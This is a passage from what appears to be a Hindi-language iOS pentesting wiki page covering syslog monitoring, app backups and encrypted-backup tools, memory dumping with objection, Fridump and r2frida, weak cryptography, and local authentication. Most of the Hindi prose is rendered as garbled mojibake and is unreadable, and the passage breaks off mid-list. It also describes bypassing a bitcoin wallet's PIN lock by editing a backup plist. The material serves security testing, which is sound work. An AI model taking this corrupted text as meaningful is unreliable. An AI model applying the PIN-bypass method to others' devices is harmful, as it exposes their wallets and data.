4. рдЕрдкрдиреЗ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдЪреБрдиреЗрдВред
5. рдЖрдк рдЬрд┐рд╕ рд╕рдорд╕реНрдпрд╛ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЙрд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВред
6. рд▓реЙрдЧ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП **Open Console** рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдПрдХ рдирдП рд╡рд┐рдВрдбреЛ рдореЗрдВ рд▓реЙрдЧ рджреЗрдЦреЗрдВред

рдЕрдзрд┐рдХ рдЙрдиреНрдирдд рд▓реЙрдЧрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП, рдбрд┐рд╡рд╛рдЗрд╕ рд╢реИрд▓реА рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдирд╛ рдФрд░ **socat** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рд▓реЙрдЧ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
рдЖрдЧреЗ рджрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ рддрд╛рдХрд┐ рд▓реЙрдЧ рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬреЛ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХрд╛ рдирд┐рджрд╛рди рдХрд░рдиреЗ рдпрд╛ рд▓реЙрдЧ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рдбреЗрдЯрд╛ рд▓реАрдХреЗрдЬ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдореВрд▓реНрдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░реЗрдВ, рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## рдмреИрдХрдЕрдк

iOS рдореЗрдВ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдмреИрдХрдЕрдк рд╕реБрд╡рд┐рдзрд╛рдПрдВ** рдПрдХреАрдХреГрдд рд╣реИрдВ, рдЬреЛ iTunes (macOS Catalina рддрдХ), Finder (macOS Catalina рдХреЗ рдмрд╛рдж) рдпрд╛ iCloud рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд┐рд╡рд╛рдЗрд╕ рдбреЗрдЯрд╛ рдХреЙрдкрд┐рдпреЛрдВ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдпреЗ рдмреИрдХрдЕрдк рд▓рдЧрднрдЧ рд╕рднреА рдбрд┐рд╡рд╛рдЗрд╕ рдбреЗрдЯрд╛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ Apple Pay рд╡рд┐рд╡рд░рдг рдФрд░ Touch ID рд╡рд┐рдиреНрдпрд╛рд╕ рдЬреИрд╕реЗ рдЕрддреНрдпрдВрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рддрддреНрд╡реЛрдВ рдХреЛ рдЫреЛрдбрд╝рдХрд░ред

### рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо

рдмреИрдХрдЕрдк рдореЗрдВ **рд╕реНрдерд╛рдкрд┐рдд рдРрдкреНрд╕ рдФрд░ рдЙрдирдХреЗ рдбреЗрдЯрд╛** рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╕реЗ **рдбреЗрдЯрд╛ рд▓реАрдХреЗрдЬ** рдХрд╛ рдореБрджреНрджрд╛ рдЙрдарддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЦрддрд░рд╛ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ **рдмреИрдХрдЕрдк рд╕рдВрд╢реЛрдзрди рдРрдк рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрди рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдРрдк рдХреЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдпрд╛ рдЗрд╕рдХреЗ рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд╕рд╛рдорд╛рдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕рд╛рджрд╛ рдкрд╛рда рдореЗрдВ рди рд░рдЦреЗрдВред

### рдмреИрдХрдЕрдк рд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЫреЛрдбрд╝рдирд╛

`Documents/` рдФрд░ `Library/Application Support/` рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдмреИрдХрдЕрдк рд╣реЛрддреА рд╣реИрдВред рдбреЗрд╡рд▓рдкрд░реНрд╕ `NSURL setResourceValue:forKey:error:` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `NSURLIsExcludedFromBackupKey` рдХреЗ рд╕рд╛рде рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдмреИрдХрдЕрдк рд╕реЗ рдЫреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдЕрднреНрдпрд╛рд╕ рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдмреИрдХрдЕрдк рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

### рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг

рдРрдк рдХреА рдмреИрдХрдЕрдк рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдкрд╣рд▓реЗ **рдлрд╛рдЗрдВрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреИрдХрдЕрдк рдмрдирд╛рдПрдВ**, рдлрд┐рд░ [рдПрдкреНрдкрд▓ рдХреЗ рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://support.apple.com/en-us/HT204215) рдХреЗ рдорд╛рд░реНрдЧрджрд░реНрд╢рди рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдЗрд╕реЗ рдвреВрдВрдвреЗрдВред рдмреИрдХрдЕрдк рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдпрд╛ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪреЗрдВ рдЬреЛ рдРрдк рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдХрдорд╛рдВрдб-рд▓рд╛рдЗрди рдЙрдкрдХрд░рдг рдпрд╛ [iMazing](https://imazing.com) рдЬреИрд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЦреЛрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдмреИрдХрдЕрдк рдХреЗ рд▓рд┐рдП, рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреА рдореМрдЬреВрджрдЧреА рдХреЛ рдмреИрдХрдЕрдк рдХреА рдореВрд▓ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ "Manifest.plist" рдлрд╝рд╛рдЗрд▓ рдореЗрдВ "IsEncrypted" рдХреБрдВрдЬреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдкреБрд╖реНрдЯрд┐ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
### рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдмреИрдХрдЕрдк рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, [DinoSec рдХреЗ GitHub рд░реЗрдкреЛ](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts) рдореЗрдВ рдЙрдкрд▓рдмреНрдз Python рд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдЬреИрд╕реЗ **backup\_tool.py** рдФрд░ **backup\_passwd.py**, рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдирд╡реАрдирддрдо iTunes/Finder рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рд╕рдВрдЧрддрддрд╛ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рдорд╛рдпреЛрдЬрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред [**iOSbackup** рдЯреВрд▓](https://pypi.org/project/iOSbackup/) рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реИ рдЬреЛ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдмреИрдХрдЕрдк рдХреЗ рднреАрддрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред

### рдРрдк рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛

рдмреИрдХрдЕрдк рд╕рдВрд╢реЛрдзрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдРрдк рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдмрджрд▓рдиреЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг [Bither рдмрд┐рдЯрдХреЙрдЗрди рд╡реЙрд▓реЗрдЯ рдРрдк](https://github.com/bither/bither-ios) рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд╣рд╛рдВ UI рд▓реЙрдХ рдкрд┐рди `net.bither.plist` рдХреЗ рдЕрдВрджрд░ **pin\_code** рдХреБрдВрдЬреА рдХреЗ рддрд╣рдд рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИред рдЗрд╕ рдХреБрдВрдЬреА рдХреЛ рдкреНрд▓рд┐рд╕реНрдЯ рд╕реЗ рд╣рдЯрд╛рдирд╛ рдФрд░ рдмреИрдХрдЕрдк рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдкрд┐рди рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ, рдЕрд╕реАрдорд┐рдд рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

## рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдореЗрдореЛрд░реА рдкрд░реАрдХреНрд╖рдг рдкрд░ рд╕рд╛рд░рд╛рдВрд╢

рдПрдХ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдореЗрдореЛрд░реА рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рд╕рдордп рд╕реАрдорд┐рдд рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдореЗрдореЛрд░реА рд╕рд╛рдордЧреНрд░реА рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рджреЛ рдореБрдЦреНрдп рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реИрдВ: **рдореЗрдореЛрд░реА рдбрдВрдк рдмрдирд╛рдирд╛** рдФрд░ **рдореЗрдореЛрд░реА рдХрд╛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рд╡рд┐рд╢реНрд▓реЗрд╖рдг**ред рджреЛрдиреЛрдВ рддрд░реАрдХреЗ рдХреЗ рдЪреБрдиреМрддрд┐рдпрд╛рдВ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдбрдВрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдпрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рджреМрд░рд╛рди рдорд╣рддреНрд╡рдкреВрд░реНрдг рдбреЗрдЯрд╛ рдХреЛ рдЫреВрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред

## **рдореЗрдореЛрд░реА рдбрдВрдк рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг**

рдЬреЗрд▓рдмреНрд░реЛрдХрди рдФрд░ рдЧреИрд░-рдЬреЗрд▓рдмреНрд░реЛрдХрди рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП, [objection](https://github.com/sensepost/objection) рдФрд░ [Fridump](https://github.com/Nightbringer21/fridump) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдРрдк рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдПрдХ рдмрд╛рд░ рдбрдВрдк рд╣реЛ рдЬрд╛рдиреЗ рдкрд░, рдЗрд╕ рдбреЗрдЯрд╛ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдХрд░рдгреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬреЛ рдЖрдк рдЦреЛрдЬ рд░рд╣реЗ рд╣реИрдВ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдкреНрд░рдХрд╛рд░ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

рдореЗрдореЛрд░реА рдбрдВрдк рд╕реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, `strings` рдпрд╛ `rabin2 -zz` рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░реЛрдВ рдпрд╛ рдкреИрдЯрд░реНрди рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП **radare2** рд╡реНрдпрд╛рдкрдХ рдЦреЛрдЬ рдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **рд░рдирдЯрд╛рдЗрдо рдореЗрдореЛрд░реА рд╡рд┐рд╢реНрд▓реЗрд╖рдг**

**r2frida** рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдПрдХ рдРрдк рдХреА рдореЗрдореЛрд░реА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ, рдореЗрдореЛрд░реА рдбрдВрдк рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ред рдпрд╣ рдЙрдкрдХрд░рдг рдЪрд▓ рд░рд╣реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдореЗрдореЛрд░реА рдкрд░ рд╕реАрдзреЗ рдЦреЛрдЬ рдХрдорд╛рдВрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИ:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## рдЯреВрдЯреА рд╣реБрдИ рдЧреБрдкреНрддрдЪрд░рдг

### рдХрдордЬреЛрд░ рдХреА рдкреНрд░рдмрдВрдзрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ

рдХреБрдЫ рдбреЗрд╡рд▓рдкрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рд╕реНрдерд╛рдиреАрдп рд╕рдВрдЧреНрд░рд╣рдг рдореЗрдВ рд╕рд╣реЗрдЬрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдХреЛрдб рдореЗрдВ рд╣рд╛рд░реНрдбрдХреЛрдб/рдкреВрд░реНрд╡рд╛рдиреБрдорд╛рдирд┐рдд рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдкрд▓рдЯрд╛рд╡ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдЧреЛрдкрдиреАрдп рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред

### рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдФрд░/рдпрд╛ рдкреБрд░рд╛рдиреЗ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рдЙрдкрдпреЛрдЧ

рдбреЗрд╡рд▓рдкрд░реЛрдВ рдХреЛ **рдкреБрд░рд╛рдиреЗ рдПрд▓реНрдЧреЛрд░рд┐рджрдо** рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **рдЬрд╛рдВрдЪреЗрдВ**, **рд╕рдВрдЧреНрд░рд╣рдг** рдпрд╛ **рднреЗрдЬреЗрдВ** рдбреЗрдЯрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдХреБрдЫ рдЗрди рдПрд▓реНрдЧреЛрд░рд┐рджрдореЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ: RC4, MD4, MD5, SHA1... рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрдЧреНрд░рд╣рдг рдХреЗ рд▓рд┐рдП рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣реИрд╢ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдкреНрд░рддрд┐рд░реЛрдзреА рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

### рдЬрд╛рдВрдЪ

рдпрджрд┐ рдЖрдк рдХреЛрдб рдореЗрдВ **рд╣рд╛рд░реНрдбрдХреЛрдб** рдкрд╛рд╕рд╡рд░реНрдб/рд░рд╣рд╕реНрдп рдорд┐рд▓рддреЗ рд╣реИрдВ, рдпрд╛ рдпрджрд┐ рд╡реЗ **рдкреВрд░реНрд╡рд╛рдиреБрдорд╛рдирд┐рдд** рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдХреЛрдб рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреЗ **рдХрдордЬреЛрд░** **рдЧреБрдкреНрддрдЪрд░рдг** рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореБрдЦреНрдп рдЬрд╛рдВрдЪреЗрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

рдпрд╣ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ рдЖрдк **objection** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ **рдХреНрд░рд┐рдкреНрдЯреЛ** **рд▓рд╛рдЗрдмреНрд░реЗрд░реА** рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ **рдореЙрдирд┐рдЯрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```swift
ios monitor crypt
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** рдХреЗ рд▓рд┐рдП iOS рдПрдиреНрдХреНрд░рд┐рдкреНрдЯрд┐рдХ API рдФрд░ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг

**рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдпрд╣ рдПрдХ рджреВрд░рд╕реНрде рд╕рдВрдмрдВрдзрд┐рдд рдмрд┐рдВрджреБ рдкрд░ рдкрд╣реБрдВрдЪ рд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рд╕рд╛рдзрди рдХрд░рдиреЗ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдХрд╛ рд╕рд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ рдЙрдЪрд┐рдд рдЕрдорд▓ рдХреЗ рдмрд┐рдирд╛, рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рддрдВрддреНрд░ рдХреЛ рдКрдкрд░ рд╕реЗ рдЪрдХреНрдХрд░ рдореЗрдВ рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдПрдкреНрдкрд▓ рдХрд╛ [**рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдлреНрд░реЗрдорд╡рд░реНрдХ**](https://developer.apple.com/documentation/localauthentication) рдФрд░ [**рдХреАрдЪреЗрди**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) рдбреЗрд╡рд▓рдкрд░реЛрдВ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрдд API рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдВрд╡рд╛рдж рдФрд░ рдЧреЛрдкрдиреАрдп рдбреЗрдЯрд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрднрд╛рд▓ рд╕рдХреЗрдВред рд╕реБрд░рдХреНрд╖рд┐рдд рдПрдиреНрдХреНрд▓реЗрд╡ рдЯрдЪ рдЖрдИрдбреА рдХреЗ рд▓рд┐рдП рдЙрдВрдЧрд▓реА рдкрд╣рдЪрд╛рди рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рдлреЗрд╕ рдЖрдИрдбреА рдмрд╛рдпреЛрдореЗрдЯреНрд░рд┐рдХ рдбреЗрдЯрд╛ рдХреЛ рдХрдо рдХрд┐рдП рдмрд┐рдирд╛ рдЪреЗрд╣рд░реЗ рдХреА рдкрд╣рдЪрд╛рди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

рдЯрдЪ рдЖрдИрдбреА/рдлреЗрд╕ рдЖрдИрдбреА рдХреЛ рдПрдХреАрдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбреЗрд╡рд▓рдкрд░реЛрдВ рдХреЗ рдкрд╛рд╕ рджреЛ API рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ:

* **`LocalAuthentication.framework`** рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕рдореЗрдВ рдмрд╛рдпреЛрдореЗрдЯреНрд░рд┐рдХ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реЛрддреАред
